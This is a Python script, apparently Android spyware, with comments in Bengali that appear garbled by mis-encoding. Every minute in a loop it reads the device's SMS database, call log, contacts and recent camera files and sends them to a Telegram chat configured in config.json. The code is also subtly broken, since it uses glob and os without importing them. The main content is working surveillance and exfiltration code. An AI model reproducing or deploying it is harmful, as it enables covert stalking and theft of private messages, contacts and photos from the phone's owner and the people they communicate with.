import sqlite3
import time
import json
from datetime import datetime
from telegram import Bot

# ‡¶ü‡ßá‡¶≤‡¶ø‡¶ó‡ßç‡¶∞‡¶æ‡¶Æ ‡¶¨‡¶ü ‡¶ü‡ßã‡¶ï‡ßá‡¶® ‡¶è‡¶¨‡¶Ç ‡¶ö‡ßç‡¶Ø‡¶æ‡¶ü ‡¶Ü‡¶á‡¶°‡¶ø ‡¶ï‡¶®‡¶´‡¶ø‡¶ó‡¶æ‡¶∞‡ßá‡¶∂‡¶® ‡¶´‡¶æ‡¶á‡¶≤ ‡¶•‡ßá‡¶ï‡ßá ‡¶™‡ßú‡¶æ
with open('config.json', 'r') as f:
    config = json.load(f)

tg_token = config['tg_token']
tg_chat_id = config['tg_chat_id']
bot = Bot(token=tg_token)

def send_telegram_message(message):
    try:
        bot.send_message(chat_id=tg_chat_id, text=message)
    except Exception as e:
        print(f"Error in sending Telegram message: {e}")

def send_sms_report():
    try:
        # SMS ‡¶°‡¶æ‡¶ü‡¶æ‡¶¨‡ßá‡¶∏ ‡¶´‡¶æ‡¶á‡¶≤‡ßá‡¶∞ ‡¶™‡¶æ‡¶•
        sms_db_path = "/data/data/com.android.providers.telephony/databases/mmssms.db"
        conn = sqlite3.connect(sms_db_path)
        cursor = conn.cursor()

        # ‡¶∏‡¶∞‡ßç‡¶¨‡¶∂‡ßá‡¶∑ ‡ßß‡ß¶‡¶ü‡¶ø SMS ‡¶¨‡¶æ‡¶∞‡ßç‡¶§‡¶æ ‡¶™‡¶°‡¶º‡¶æ
        cursor.execute("SELECT address, date, body FROM sms ORDER BY date DESC LIMIT 10")
        sms_data = cursor.fetchall()

        sms_report = "üì© New SMS Messages:\n\n"

        for msg in sms_data:
            sender = msg[0]
            date = datetime.utcfromtimestamp(int(msg[1]) / 1000).strftime('%Y-%m-%d %H:%M:%S')
            body = msg[2]

            # ‡¶¨‡¶æ‡¶∞‡ßç‡¶§‡¶æ ‡¶´‡¶∞‡¶Æ‡ßç‡¶Ø‡¶æ‡¶ü
            sms_report += f"From: {sender}\nTime: {date}\nMessage: {body}\n\n"

        send_telegram_message(sms_report)  # ‡¶ü‡ßá‡¶≤‡¶ø‡¶ó‡ßç‡¶∞‡¶æ‡¶Æ‡ßá ‡¶™‡¶æ‡¶†‡¶æ‡¶®‡ßã

    except Exception as e:
        print(f"Error in SMS report: {e}")

def send_call_log_report():
    try:
        # ‡¶ï‡¶≤ ‡¶≤‡¶ó ‡¶°‡¶æ‡¶ü‡¶æ‡¶¨‡ßá‡¶∏ ‡¶´‡¶æ‡¶á‡¶≤‡ßá‡¶∞ ‡¶™‡¶æ‡¶•
        call_log_db_path = "/data/data/com.android.providers.contacts/databases/calllog.db"
        conn = sqlite3.connect(call_log_db_path)
        cursor = conn.cursor()

        # ‡¶∏‡¶∞‡ßç‡¶¨‡¶∂‡ßá‡¶∑ ‡ßß‡ß¶‡¶ü‡¶ø ‡¶ï‡¶≤ ‡¶≤‡¶ó ‡¶™‡¶°‡¶º‡¶æ
        cursor.execute("SELECT number, date, duration, type FROM calls ORDER BY date DESC LIMIT 10")
        call_data = cursor.fetchall()

        call_report = "üìû Recent Call Logs:\n\n"

        for call in call_data:
            number = call[0]
            date = datetime.utcfromtimestamp(int(call[1]) / 1000).strftime('%Y-%m-%d %H:%M:%S')
            duration = call[2]
            call_type = "Incoming" if call[3] == 1 else "Outgoing"

            # ‡¶ï‡¶≤ ‡¶≤‡¶ó ‡¶´‡¶∞‡¶Æ‡ßç‡¶Ø‡¶æ‡¶ü
            call_report += f"Number: {number}\nTime: {date}\nDuration: {duration}s\nType: {call_type}\n\n"

        send_telegram_message(call_report)  # ‡¶ü‡ßá‡¶≤‡¶ø‡¶ó‡ßç‡¶∞‡¶æ‡¶Æ‡ßá ‡¶™‡¶æ‡¶†‡¶æ‡¶®‡ßã

    except Exception as e:
        print(f"Error in call log report: {e}")

def send_contact_report():
    try:
        # ‡¶ï‡¶®‡ßç‡¶ü‡¶æ‡¶ï‡ßç‡¶ü ‡¶°‡¶æ‡¶ü‡¶æ‡¶¨‡ßá‡¶∏ ‡¶´‡¶æ‡¶á‡¶≤‡ßá‡¶∞ ‡¶™‡¶æ‡¶•
        contacts_db_path = "/data/data/com.android.providers.contacts/databases/contacts2.db"
        conn = sqlite3.connect(contacts_db_path)
        cursor = conn.cursor()

        # ‡¶∏‡¶∞‡ßç‡¶¨‡¶∂‡ßá‡¶∑ ‡ßß‡ß¶‡¶ü‡¶ø ‡¶ï‡¶®‡ßç‡¶ü‡¶æ‡¶ï‡ßç‡¶ü ‡¶™‡¶°‡¶º‡¶æ
        cursor.execute("SELECT display_name, number FROM view_data ORDER BY display_name ASC LIMIT 10")
        contact_data = cursor.fetchall()

        contact_report = "üìá New Contacts:\n\n"

        for contact in contact_data:
            name = contact[0]
            number = contact[1]

            # ‡¶ï‡¶®‡ßç‡¶ü‡¶æ‡¶ï‡ßç‡¶ü ‡¶´‡¶∞‡¶Æ‡ßç‡¶Ø‡¶æ‡¶ü
            contact_report += f"Name: {name}\nPhone: {number}\n\n"

        send_telegram_message(contact_report)  # ‡¶ü‡ßá‡¶≤‡¶ø‡¶ó‡ßç‡¶∞‡¶æ‡¶Æ‡ßá ‡¶™‡¶æ‡¶†‡¶æ‡¶®‡ßã

    except Exception as e:
        print(f"Error in contact report: {e}")

def send_file_report():
    try:
        # ‡¶õ‡¶¨‡¶ø ‡¶¨‡¶æ ‡¶≠‡¶ø‡¶°‡¶ø‡¶ì ‡¶°‡¶ø‡¶∞‡ßá‡¶ï‡ßç‡¶ü‡¶∞‡¶ø
        watch_directory = "/sdcard/DCIM/Camera/"  # ‡¶õ‡¶¨‡¶ø‡¶∞ ‡¶¨‡¶æ ‡¶≠‡¶ø‡¶°‡¶ø‡¶ì ‡¶´‡ßã‡¶≤‡ßç‡¶°‡¶æ‡¶∞‡ßá‡¶∞ ‡¶™‡¶æ‡¶•
        files = glob.glob(watch_directory + "*")

        file_report = "üñºÔ∏è New Files/Photos/Videos:\n\n"
        for file in files:
            if os.path.getctime(file) > time.time() - 3600:  # ‡¶∂‡ßá‡¶∑ ‡ßß ‡¶ò‡¶£‡ßç‡¶ü‡¶æ‡¶∞ ‡¶Æ‡¶ß‡ßç‡¶Ø‡ßá ‡¶Ø‡¶æ ‡¶è‡¶∏‡ßá‡¶õ‡ßá
                file_report += f"File: {file}\n\n"
                send_telegram_message(file_report)  # ‡¶ü‡ßá‡¶≤‡¶ø‡¶ó‡ßç‡¶∞‡¶æ‡¶Æ‡ßá ‡¶´‡¶æ‡¶á‡¶≤ ‡¶™‡¶æ‡¶†‡¶æ‡¶®‡ßã

    except Exception as e:
        print(f"Error in file report: {e}")

def start_monitoring():
    while True:
        send_sms_report()
        send_call_log_report()
        send_contact_report()
        send_file_report()
        time.sleep(60)  # ‡¶™‡ßç‡¶∞‡¶§‡¶ø ‡ßß ‡¶Æ‡¶ø‡¶®‡¶ø‡¶ü ‡¶™‡¶∞‡¶™‡¶∞ ‡¶ö‡ßá‡¶ï ‡¶ï‡¶∞‡¶¨‡ßá

if __name__ == "__main__":
    start_monitoring()
